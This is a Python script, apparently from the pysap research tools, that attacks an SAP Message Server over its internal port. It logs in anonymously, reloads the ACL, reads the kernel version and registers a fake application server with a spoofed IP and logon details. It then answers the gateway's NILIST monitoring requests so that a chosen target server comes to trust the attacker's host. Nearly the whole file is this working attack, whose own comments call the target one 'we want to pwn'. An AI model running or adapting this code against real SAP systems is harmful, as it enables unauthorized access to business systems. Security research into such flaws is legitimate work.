#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2018-2019 by Mathieu @gelim Geli
#
# The library was designed and developed by Mathieu Geli from
# ERPScan Corporation's Labs team.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

from pysap.SAPNI import SAPNI,SAPNIStreamSocket
from pysap.SAPMS import SAPMS,SAPMSProperty,SAPMSLogon,SAPMSClient4,SAPMSAdmRecord
from pysap.SAPMS import SAPDPInfo1,SAPDPInfo2,SAPDPInfo3
from pysap.SAPMS import ms_flag_values,ms_iflag_values,ms_opcode_values
from pysap.SAPMS import ms_client_status_values,ms_opcode_error_values
from pysap.SAPMS import ms_adm_opcode_values, ms_adm_rzl_strg_type_values
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPDiagItems import *
from scapy.supersocket import StreamSocket
from scapy.sendrecv import sniff
from scapy.utils import hexdump,inet_ntoa,inet_aton
from scapy.packet import bind_layers
from scapy.layers.inet import TCP,Raw
from scapy.config import conf
from ansicolor import red,green,blue,yellow,cyan,magenta
from pprint import pprint
import subprocess
import argparse
import datetime
import tempfile
import logging
import socket
import struct
import random
import signal
import time
import sys
import os
import re


help_desc = '''
Resgiter our fake AS via Message Server to be trusted by remote gateway.
This requires network access to the MS internal port 39NN.
-- gelim
'''

def sigint_handler(signal, frame):
    ms_logout(s)
    exit(0)

# Init logging subsystem
# name = will be used as part of filename
# (and internal name for logger)
def init_logger(logname, level):
    # generic log conf
    logger = logging.getLogger(logname)
    logger.setLevel(level)
    file_format = logging.Formatter("%(asctime)s [%(levelname)-6s] %(message)s")
    console_format = logging.Formatter("[%(levelname)-5s] %(message)s")
    # console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(level)
    ch.setFormatter(console_format)
    logger.addHandler(ch)

    # file handler
    # using parent pid in filename to have 'session'-like log files
    logfile="%s/%s_%d.log" % (tempfile.gettempdir(), logname, os.getppid())
    fh = logging.FileHandler(logfile, "a")
    fh.setLevel(level)
    fh.setFormatter(file_format)
    logger.addHandler(fh)
    return logger

def net_get_ip():
    return [(s.connect(('8.8.8.8', 53)),
             s.getsockname()[0],
             s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]

def gen_ms_servername(host, sid, instance):
    ms_fromname_len = 40 # hardcoded stuff
    as_name = '%s_%s_%s' % (host, sid, instance)
    num_space = 40 - len(as_name)
    if num_space < 0:
        logger.error("[!] You have a hostname too long (hostname: %s)" % host)
        logger.error("    Shorten it by %d chars at least " % -num_space)
        exit(1)
    as_name += ' '*num_space
    return as_name

def ms_build_del_logon_by_type(type):
    return SAPMS(toname=msg_server_name,
                 fromname=my_name,
                 flag='MS_REQUEST',
                 iflag='MS_SEND_NAME',
                 opcode='MS_DEL_LOGON',
                 logon=SAPMSLogon(type=type,
                                  logonname_length=0,
                                  prot_length=0,
                                  host_length=0,
                                  misc_length=0,
                                  address6_length=65535))

def ms_build_set_logon(ptype, serv_info):
    if ptype == 'diag':
        logon_type = 'MS_LOGON_DIAG'
        port = serv_info['diag_port']
    elif ptype == 'rfc':
        logon_type = 'MS_LOGON_RFC'
        port = serv_info['rfc_port']
    address = serv_info['ip']
    host = serv_info['fqdn']

    p = SAPMS(fromname=my_name,
              toname=msg_server_name,
              flag='MS_REQUEST',
              iflag='MS_SEND_NAME',
              opcode='MS_SET_LOGON',
              logon=SAPMSLogon(type=logon_type,
                               port=port,
                               address=address,
                               logonname_length=0,
                               prot_length=0,
                               host_length=len(host),
                               host=host,
                               misc_length=4,
                               misc='LB=9'))/Raw(load="\xff\xff")
    return p

def mskey_parse_print(key):
    foo, key_t, key_u, respid = struct.unpack('!BBHL', key)
    logger.debug("got key %s, => session T%d_U%d_M0 (RespId %d)" % (key.encode('hex'),
                                                                           key_t, key_u,
                                                                           respid))
    return key_t, key_u, respid

#
# Print meta info about the  received packet
# p: received SAPMS packet
#
def print_answer(p):
    fromname = p.fromname

    try:
        flag = ms_flag_values[p[SAPMS].flag]
    except:
        flag = "0"
    try:
        opcode = str(ms_opcode_values[p[SAPMS].opcode])
    except:
        opcode = str(p[SAPMS].opcode)
    try:
        opcode_err = str(ms_opcode_error_values[p[SAPMS].opcode_error])
    except:
        opcode_err = 'None'

    if opcode_err == 'MSOP_OK':
        opcode_err = green(opcode_err)
    else:
        opcode_err = red(opcode_err, bold=True)

    if p.key != null_key:
        mskey_parse_print(p.key)
        key = p.key.encode('hex')
    else:
        key = "NULL"

    logger.debug("flag: " + cyan(flag) + " opcode:" + cyan(opcode) + \
        " opcode_error: " + green(opcode_err) + " key: %s" % key)

#
# Build "IP records" for ADM packet MS_REPLY|MS_SEND_NAME|AD_SELFIDENT
#
def ms_adm_build_ip_record(ip):
    # \x00\x00\x00\x01
    # \x00\x00\x00\x00
    # \x00\x00\x00\x00
    # \x00\x00\xff\xff  <- looks like a netmask, but network order is same as the IP...
    # \x7f\x00\x00\x01  <- IP of interface (127.0.0.1)
    # \x00\x00\x00\x00
    # \x00\x0c\xe5
    # 35 * '\x00 '      <- some UTF-16-BE big space string (or LE if we take ' ' as first byte)
    return struct.pack("!I", 1) + struct.pack("!I", 0) + \
        struct.pack("!I", 0) + socket.inet_aton("0.0.255.255") + \
        socket.inet_aton(ip) + struct.pack("!I", 0) + "\x00\x00\x0c\xe5" + " \x00" * 35 + ' '


# required for kernel 720
def ms_adm_build_old_ip_record(ip):
    # \x00\x00\x00\x00
    # \x00\x00\x00\x00
    # \x00\x00\xff\xff
    # \x7f\x00\x00\x01
    # (41 * ' ').encode('UTF-16-BE')

    return struct.pack("!II", 0, 0) + \
        socket.inet_aton("0.0.255.255") + \
        socket.inet_aton(ip) + \
        (41 * ' ').encode('UTF-16-BE')

#
# Build a response to GWMON request
# depends on the version of the kernel (720, 742 is hybrid, 745, or 749)
#
def ms_adm_nilist(p, whos_asking):
    print "[+] " + yellow("Generating AD_GET_NILIST_PORT answer for request with key", bold=True) + " '%s'" % p.key.encode('hex')
    fromname = str()
    toname = str()
    answer=1

    # extract info from key
    foo, key_t, key_u, key_respid = struct.unpack('!BBHL', p.key)
    
    fromname = my_name
    toname=p.fromname

    key = p.key
    flag = 'MS_REPLY'
    opcode_version = 5
    adm_type = 'ADM_REPLY'
    rec=' '*100
    recno=0
    records=None

    r = SAPMS(toname=toname,
              fromname=fromname,
              key=key,
              domain='ABAP',
              flag=flag,
              iflag='MS_SEND_NAME',
              opcode='MS_DP_ADM',
              opcode_version=p.opcode_version,
              opcode_charset=p.opcode_charset,
              dp_version=p.dp_version,
              adm_recno=recno,
              adm_type=adm_type,
              adm_records=records)

    ###############################
    # 745 KERNEL and sometime 742 #
    ###############################
    # why "sometime" for 742?
    # they have both programs, old "RSMONGWY_SEND_NILIST" and new "RGWMON_SEND_NILIST"
    # they both use dp_version=13, but IP list format expected in the ADM layer is a
    # bit different between both programs.
    if p.dp_version == 13:
        r.adm_recno = 4
        if 'RSMONGWY_SEND_NILIST' in whos_asking:
            r.adm_records = [SAPMSAdmRecord(opcode='AD_SELFIDENT', record=rec,
                                            serial_number=0, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                            record=ms_adm_build_old_ip_record("127.0.0.1"),
                                            serial_number=0, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                            record=ms_adm_build_old_ip_record("127.0.0.2"),
                                            serial_number=1, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                            record=ms_adm_build_old_ip_record(fake_as["ip"]),
                                            serial_number=2, executed=answer)]
        else:
            r.adm_records = [SAPMSAdmRecord(opcode='AD_SELFIDENT', record=rec,
                                            serial_number=0, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                            record=ms_adm_build_ip_record("127.0.0.1"),
                                            serial_number=0, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                            record=ms_adm_build_ip_record("127.0.0.2"),
                                            serial_number=1, executed=answer),
                             SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                            record=ms_adm_build_ip_record(fake_as["ip"]),
                                            serial_number=2, executed=answer)]
        r.dp_info1 = SAPDPInfo1(dp_req_len = 452,
                                dp_req_prio = 'MEDIUM',

                                dp_type_from = 'BY_NAME',
                                dp_fromname=my_name,
                                dp_agent_type_from = 'DISP',
                                dp_worker_from_num = p.dp_info1.dp_worker_to_num,

                                dp_addr_from_t = p.dp_info1.dp_addr_from_t,
                                dp_addr_from_u = p.dp_info1.dp_addr_from_u,
                                dp_addr_from_m = 0,
                                dp_respid_from = p.dp_info1.dp_respid_from,

                                dp_type_to = 'BY_NAME',
                                dp_toname=p.fromname,
                                dp_agent_type_to = 'WORKER',
                                dp_worker_type_to = 'DIA',
                                dp_worker_to_num = p.dp_info1.dp_worker_from_num,

                                dp_addr_to_t = p.dp_info1.dp_addr_from_t,
                                dp_addr_to_u = p.dp_info1.dp_addr_from_u,
                                dp_addr_to_m = p.dp_info1.dp_addr_from_m,
                                dp_respid_to = p.dp_info1.dp_respid_from,

                                dp_req_handler='REQ_HANDLER_ADM_RESP',

                                dp_blob_worker_from_num = p.dp_info1.dp_worker_from_num,
                                dp_blob_addr_from_t = p.dp_info1.dp_addr_from_t,
                                dp_blob_addr_from_u = p.dp_info1.dp_addr_from_u,
                                dp_blob_respid_from = p.dp_info1.dp_blob_respid_from,
                                dp_blob_dst = (' '*35).encode('UTF-16-BE'))

    ##############
    # 720 KERNEL #
    ##############
    # Here we use old IP list format
    # and a much simpler DP layer
    if p.dp_version == 11:
        r.adm_recno = 4
        r.adm_records = [SAPMSAdmRecord(opcode='AD_SELFIDENT', record=rec,
                                        serial_number=0, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                        record=ms_adm_build_old_ip_record("127.0.0.1"),
                                        serial_number=0, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                        record=ms_adm_build_old_ip_record("127.0.0.2"),
                                        serial_number=1, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST',
                                        record=ms_adm_build_old_ip_record(fake_as["ip"]),
                                        serial_number=2, executed=answer)]

        r.dp_info2 = SAPDPInfo2(dp_req_prio = 'MEDIUM',
                                dp_blob_14 = p.dp_info2.dp_blob_14,
                                dp_name_to = p.fromname,
                                dp_addr_from_t = 255,

                                dp_blob_09 = '\xff\xcc',
                                dp_blob_10 = '\x01\x00',

                                dp_addr_from_u = 0,
                                dp_addr_from_m = 0,

                                dp_addr_to_t = key_t,
                                dp_addr_to_u = key_u,
                                dp_addr_to_m = 0,
                                dp_respid_to = key_respid,

                                dp_blob_19 = 1,
                                dp_blob_21 = 105)
    ##############
    # 749 KERNEL #
    ##############
    # That's use on latest kernel like S4HANA servers
    if p.dp_version == 14:
        r.adm_recno = 4
        r.adm_records = [SAPMSAdmRecord(opcode='AD_SELFIDENT', record=rec,
                                        serial_number=0, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                        record=ms_adm_build_ip_record("127.0.0.1"),
                                        serial_number=0, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                        record=ms_adm_build_ip_record("127.0.0.2"),
                                        serial_number=1, executed=answer),
                         SAPMSAdmRecord(opcode='AD_GET_NILIST_PORT',
                                        record=ms_adm_build_ip_record(fake_as["ip"]),
                                        serial_number=2, executed=answer)]
        r.dp_info3 = SAPDPInfo3(dp_req_len = 348,
                                dp_req_prio = 'MEDIUM',

                                dp_type_from = 'BY_NAME',
                                dp_fromname=my_name,
                                dp_agent_type_from = 'DISP',
                                dp_worker_from_num = p.dp_info3.dp_worker_to_num,

                                dp_addr_from_t = p.dp_info3.dp_addr_from_t,
                                dp_addr_from_u = p.dp_info3.dp_addr_from_u,
                                dp_addr_from_m = 0,
                                dp_respid_from = p.dp_info3.dp_respid_from,

                                dp_type_to = 'BY_NAME',
                                dp_toname=p.fromname,
                                dp_agent_type_to = 'WORKER',
                                dp_worker_type_to = 'DIA',
                                dp_worker_to_num = p.dp_info3.dp_worker_from_num,

                                dp_addr_to_t = p.dp_info3.dp_addr_from_t,
                                dp_addr_to_u = p.dp_info3.dp_addr_from_u,
                                dp_respid_to = p.dp_info3.dp_respid_from,
                                dp_padd25 = 1,
                                dp_req_handler='REQ_HANDLER_ADM_RESP',

                                dp_padd29 = p.dp_info3.dp_padd29,
                                dp_padd30 = p.dp_info3.dp_padd30,
                                dp_padd31 = p.dp_info3.dp_padd31,
                                dp_padd32 = p.dp_info3.dp_padd32)
    open("/tmp/dp.bin", "wb").write(str(SAPNI()/r))
    return r

def as_print(as_d, active=True):
    if not as_d.keys(): return
    print "-"*120
    for a in as_d.keys():
        if active and as_d[a]['status'] != 1: # ACTIVE
            continue
        print ("%s" % a).ljust(30) + "| " + \
            ("%s" % as_d[a]['host']).ljust(20) + "| " + \
            ("%s" % as_d[a]['ip']).ljust(16) + "| " + \
            ("%s" % as_d[a]['port']).ljust(8) + "| " + \
            ("%s" % as_d[a]['type']).ljust(27) + "| " + \
            ("%s" % as_d[a]['status'])
    print "-"*120

def ms_connect(mshost, msport, login_packet):
    try:
        s = SAPNIStreamSocket.get_nisocket(mshost, msport)
    except socket.error:
        logger.error("[!] Connection error to %s:%s" % (mshost, msport))
        exit(-1)
    logger.debug("[+] Sending MS_LOGIN_2")
    r = s.sr(login_packet)
    print_answer(r)
    return s

def ms_logout(s):
    logger.debug("[+] Sending MS_LOGOUT")
    try:
        s.send(p_logout)
        s.close()
    except:
        logger.error("Socket error when sending MS_LOGOUT")


# Send a sequence of 3 packets to get the list of application servers
# registered to the message server This is called anonymous because
# fromname is '-'
def ms_get_server_list_anon(s):
    as_list_d = dict()
    for p in p_get_server_list_l:
        logger.debug("[+] Sending %s" % ms_opcode_values[p.opcode])
        s.send(p)
    r = s.recv()

    if not r.clients:
        logger.error("[!] Answer doesn't contain server list.")
        return as_list_d

    print_answer(r)
    for c in r.clients:
        as_list_d[c.client.strip()] = {"host": c.host.strip(),
                                       "ip": c.hostaddrv4,
                                       "port": c.servno,
                                       "type": c.sprintf('%SAPMSClient4.msgtype%'),
                                       "status": ms_client_status_values[c.status]}
    return as_list_d

# This is a slighty different packets for getting server list when we
# are not anonymous anymore
def ms_get_server_list(s, key):
    as_list_d = dict()
    p = SAPMS(fromname=my_name,
              toname=msg_server_name,
              key=key,
              flag='MS_REQUEST',
              opcode='MS_SERVER_LST',
              opcode_error='MSOP_OK',
              opcode_version=104,
              opcode_charset=3)

    r = s.sr(p)
    
    if not r.clients:
        logger.error("[!] Answer doesn't contain server list.")
        #s.close()
        return as_list_d # dict()
    
    print_answer(r)
    for c in r.clients:
        as_list_d[c.client.strip()] = {"host": c.host.strip(),
                                       "ip": c.hostaddrv4,
                                       "port": c.servno,
                                       "type": c.sprintf('%SAPMSClient4.msgtype%'),
                                       "status": ms_client_status_values[c.status]}
    return as_list_d

def extract_serv_ver(r, substr, l):
    return r[r.index(substr)+len(substr):r.index(substr)+len(substr)+l]

#########################
# GLOBAL PACKETS / VARS #
#########################

sleep = 1
# that's you
short_host = "sapdev%.4d" % (random.randint(0, 9999))
fake_as = {"ip": net_get_ip(),
           "host": short_host,
           "diag_port": 3200,
           "rfc_port": 3300,
           "fqdn": "%s.fake.tld" % short_host}

# that's our target we want to pwn
attacked_as = {"ip": "172.16.100.50",
               "host": "sap-abap-01",
               "msport": 3901,
               "sid": "DEV",
               "instance": "00",
               "release":"745",
               "patchno":"15"}


my_name = gen_ms_servername(fake_as["host"], attacked_as["sid"], attacked_as["instance"])
anon_name = '-' + ' '*39

msg_server_name = 'MSG_SERVER' # \x00MsgServer\x00FN_CHECK\x00FN_TP\x00tp$('
null_key = "\x00" * 8

p_logout = SAPMS(toname=anon_name,
                 fromname=anon_name,
                 flag=0,
                 iflag='MS_LOGOUT')

p_login_anon = SAPMS(toname=anon_name,
                     fromname=anon_name,
                     flag=0,
                     iflag='MS_LOGIN_2')

p_login_diag = SAPMS(toname=anon_name,
                     fromname=my_name,
                     msgtype='DIA+UPD+BTC+SPO+UP2+ICM',
                     flag=0,
                     iflag='MS_LOGIN_2',
                     diag_port=fake_as['diag_port'])

p_login_rfc = SAPMS(toname=anon_name,
                     fromname=my_name,
                     msgtype='DIA+UPD+BTC+SPO+UP2+ICM',
                     flag=0,
                     iflag='MS_LOGIN_2',
                     diag_port=fake_as['rfc_port'])

p_reload = SAPMS(toname=msg_server_name,
                 fromname=anon_name,
                 flag='MS_REQUEST',
                 opcode='MS_FILE_RELOAD',
                 opcode_version=1,
                 opcode_charset=3,
                 opcode_value=6)

p_checkacl = SAPMS(toname=msg_server_name,
                   fromname=anon_name,
                   flag='MS_REQUEST',
                   opcode='MS_CHECK_ACL',
                   opcode_version=1,
                   opcode_charset=0)

p_kernel_info = SAPMS(toname=msg_server_name,
                      flag='MS_REQUEST',
                      fromname=my_name,
                      opcode='MS_DUMP_INFO',
                      dump_command='MS_DUMP_RELEASE',
                      dump_dest=2,
                      )

p_prop_set_release = SAPMS(toname=msg_server_name,
                           flag='MS_REQUEST',
                           fromname=my_name,
                           opcode='MS_SET_PROPERTY',
                           opcode_charset=0,
                           property=SAPMSProperty(id='Release information',
                                                  release='745',
                                                  patchno=0,
                                                  platform=390))
p_prop_set_service = SAPMS(fromname=my_name,
                           toname=msg_server_name,
                           flag='MS_REQUEST',
                           iflag='MS_SEND_NAME',
                           opcode='MS_SET_PROPERTY',
                           opcode_version=1,
                           opcode_charset=0,
                           property=SAPMSProperty(client='',
                                                  id='MS_PROPERTY_SERVICE',
                                                  service=1))/Raw(load='\x07')

p_get_server_list_l = [ SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_ONE_WAY',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LONG_LIST',
                              opcode_version=1,
                              opcode_charset=0),
                        
                        SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_ONE_WAY',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LONG_LIST',
                              opcode_version=1,
                              opcode_charset=0),
                        
                        SAPMS(fromname=anon_name,
                              toname=msg_server_name,
                              flag='MS_REQUEST',
                              iflag='MS_SEND_NAME',
                              opcode='MS_SERVER_LST',
                              opcode_version=104,
                              opcode_charset=3) ]

p_mod_state = SAPMS(fromname=my_name,
                    toname=anon_name,
                    msgtype='DIA+ENQ',
                    flag='MS_REQUEST',
                    iflag="MS_MOD_STATE")


p_change_ip = SAPMS(fromname=my_name,
                    toname=msg_server_name,
                    flag='MS_REQUEST',
                    iflag='MS_SEND_NAME',
                    opcode='MS_CHANGE_IP',
                    opcode_version=2,
                    opcode_charset=0,
                    change_ip_addressv4=fake_as["ip"],
                    change_ip_addressv6='::ffff:' + fake_as["ip"])

p_set_ip_property = SAPMS(fromname=my_name,
                          toname=anon_name,
                          flag='MS_REQUEST',
                          iflag='MS_SEND_NAME',
                          opcode='MS_SET_PROPERTY')/SAPMSProperty(client=my_name,
                                                                  id='MS_PROPERTY_IPADR',
                                                                  address=fake_as['ip'])
                          
p_change_active = SAPMS(fromname=my_name,
                    toname=anon_name,
                    flag='MS_REQUEST',
                    iflag='MS_MOD_STATE',
                    msgtype='DIA')
                    
p_server_long_list = SAPMS(fromname=my_name,
                           toname=msg_server_name,
                           flag='MS_REQUEST',
                           iflag='MS_SEND_NAME',
                           opcode='MS_SERVER_LONG_LIST',
                           opcode_version=1,
                           opcode_charset=0)
p_server_chg = SAPMS(fromname=my_name,
                     toname=msg_server_name,
                     flag='MS_REQUEST',
                     iflag='MS_SEND_NAME',
                     opcode='MS_SERVER_CHG',
                     opcode_version=4,
                     opcode_charset=0)

p_get_hwid = SAPMS(fromname=my_name,
                   toname=msg_server_name,
                   flag='MS_REQUEST',
                   iflag='MS_SEND_NAME',
                   opcode='MS_GET_HWID',
                   opcode_version=1,
                   opcode_charset=0,
                   hwid=struct.pack("!I", os.getpid()))


if __name__ == '__main__':
    signal.signal(signal.SIGINT, sigint_handler)
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='sap-abap-01', help='AS victim IP/hostname (default: sap-abap-01)')
    parser.add_argument('-P', '--port', default=3901, type=int, help='AS internal message server port (default: 3901)')
    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
    parser.add_argument('-q', '--quiet', action='store_true', help='Don\'t show any info messages')
    
    args = parser.parse_args()

    prog = 'sap_ms_dispatcher_mitm'
    if args.quiet:
        logger = init_logger(prog, logging.NOTSET)
    elif args.debug:
        logger = init_logger(prog, logging.DEBUG)
    else:
        logger = init_logger(prog, logging.INFO)

    # update our default conf with customized version:
    attacked_as["host"] = args.host
    attacked_as["msport"] = args.port

    conf.L3Socket = StreamSocket
    # SAPMS layer
    bind_layers(TCP, SAPNI)
    bind_layers(TCP, SAPNI)
    bind_layers(SAPNI, SAPMS)
    # SAPDIAG layer
    bind_layers(SAPDiagDP, SAPDiag,)
    bind_layers(SAPDiag, SAPDiagItem,)
    bind_layers(SAPDiagItem, SAPDiagItem,)

    # 1- Simple Login / Logout
    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_anon)
    logger.debug("[+] Sending MS_LOGOUT")
    ms_logout(s)

    # 2- Login, ask to reload ACL file and check ACL
    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_anon)
    logger.debug("[+] Sending MS_FILE_RELOAD")
    r = s.sr(p_reload)
    print_answer(r)
    logger.debug("[+] Sending MS_CHECK_ACL")
    r = s.sr(p_checkacl)
    print_answer(r)
    ms_logout(s)

    #3 - Getting kernel version
    logger.debug("[+] Sending MS_DUMP_RELEASE") 
    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_anon)
    r = s.sr(p_kernel_info)
    attacked_as["release"] = int(extract_serv_ver(r[SAPMS].opcode_value, 'kernel release = ', 3))
    attacked_as["patchno"] = int(extract_serv_ver(r[SAPMS].opcode_value, 'source id = 0.', 3))
    logger.info("kernel=%s, patch_nbr=%s" % (attacked_as["release"], attacked_as["patchno"]))

    # 4- Login and set property with our release information
    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_anon)

    logger.debug("[+] Sending MS_SET_PROPERTY")
    p = p_prop_set_release
    p.property.release = attacked_as["release"]
    p.property.patchno = attacked_as["patchno"]
    r = s.sr(p)
    print_answer(r)
    ms_logout(s)

    # 5- Login back now with our "service" name
    
    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_diag)
    logger.debug("[+] Sending MS_MOD_STATE")
    s.send(p_mod_state)
                
    # 6- Set IP address
    logger.debug("[+] Sending MS_CHANGE_IP")
    r = s.sr(p_change_ip)
    print_answer(r)

    # 7- Set Logon information (RFC)
    logger.debug("[+] Sending MS_SET_LOGON (rfc)")
    r = s.sr(ms_build_set_logon("diag", fake_as))
    print_answer(r)

    r = s.sr(ms_build_set_logon("rfc", fake_as))
    print_answer(r)

    r = s.sr(ms_build_set_logon("rfc", fake_as))
    print_answer(r)

    # 9- Set status to ACTIVE
    logger.debug("[+] Changing status to ACTIVE")
    s.send(p_change_active)

    # 10- Check that we are properly registered (AS dump)
    ms_get_server_list_anon(s)
    as_list_d = ms_get_server_list_anon(s)
    if not as_list_d.keys():
        print "AS list is void, you have a protocol issue. Relaunch the script."
        exit(0)
    as_print(as_list_d, False)

    #debug_dp()
    # 11- Select a target we will force to trust us
    print "Choose which AS you want to target?"
    target_list = as_list_d.keys()
    if my_name.strip() in target_list: target_list.remove(my_name.strip())
    if "-" in target_list: target_list.remove("-")
    print red("\n".join(target_list))
    if len(target_list) == 1:
        print "Selecting automatically unique target '%s'" % target_list[0]
        target = target_list[0]
    else:
        target = raw_input("? ")
    
    # 11- Here looping and answer to RGWMON_SEND_NILIST + SELFIDENT packets
    while True:
        logger.info("Waiting for packets...")
        r = s.recv()

        # most of the case when packet is properly parsed
        if r.haslayer(SAPMSAdmRecord):
            rec = r.adm_records[0].record
            if not rec: continue
            opc = ms_adm_opcode_values[r.adm_records[0].opcode]

            # discard packets if key is NULL
            if r.key == null_key: continue
            foo, key_t, key_u, key_respid = struct.unpack('!BBHL', r.key)
            print "%s > %s: key '%s' = session T%d_U%d_M0 (RespId %d)" % (yellow(r[SAPMS].fromname.strip()),
                                                                                 yellow(r[SAPMS].toname.strip()),
                                                                                 r.key.encode('hex'), key_t, key_u, key_respid)

            if 'RGWMON_SEND_NILIST' in rec or 'RSMONGWY_SEND_NILIST' in rec:
                if args.debug: r.show()
                print "%s > %s: Ask for RGWMON_SEND_NILIST report" % (yellow(r[SAPMS].fromname.strip()),
                                                                      yellow(r[SAPMS].toname.strip()))
                # let's filter out packets from other AS
                if r[SAPMS].fromname.strip() != target:
                    print "Dropping packet as it's not from our target."
                    continue

                p = ms_adm_nilist(r, rec)
                if args.debug:
                    p.show()
                    hexdump(p)
                    print "Len request:", len(r)
                    print "Len answer:", len(p)
                s.send(p)

            # Case where parsing is broken (because some DP ADM packets are sent with
            # opcode = MS_SERVER_CHG and that's not handled in SAPMS...
            # there are SAPAdmRecords but the DP layer has not been parsed properly
            # so nothing makes really sense
            #
            # This was observed on 30.14 (kernel 742, patchlevel 28)
            if r.adm_eyecatcher.startswith('\x0d') and 'SEND_NILIST' in str(r):
                str_r = str(r)
                dp = SAPDPInfo1(str_r[0x77:])
                ad_rec_offset = str_r.find('AD-EYECATCH')+35
                if 'RSMONGWY_SEND_NILIST' in str_r: rec = 'RSMONGWY_SEND_NILIST'
                elif 'RGWMON_SEND_NILIST' in str_r: rec = 'RGWMON_SEND_NILIST'

                p = SAPMS()
                p.key = r.key
                p.fromname = r.fromname
                p.toname = r.toname
                p.dp_version = 13
                p.dp_info1 = dp

                pp = ms_adm_nilist(p, rec)
                if args.debug:
                    pp.show()
                    hexdump(pp)
                    print "Len request:", len(r)
                    print "Len answer:", len(pp)
                s.send(pp)
